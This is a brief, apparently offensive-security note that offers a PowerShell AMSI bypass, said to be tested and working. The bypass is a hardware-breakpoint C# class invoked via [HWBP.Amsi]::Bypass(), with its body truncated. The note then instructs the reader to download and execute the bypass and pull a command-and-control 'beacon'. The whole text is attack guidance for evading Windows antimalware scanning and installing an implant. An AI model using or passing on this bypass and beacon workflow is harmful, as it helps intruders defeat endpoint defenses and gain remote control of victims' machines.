This was `tested` in the environment and it does work.

save this `script` as `bypass.txt` anywhere
```powershell
$HWBP = @"
using System;
...
[HWBP.Amsi]::Bypass()
```
utilize this command to `download` and execute the `bypass` then run the command to pull a `beacon`
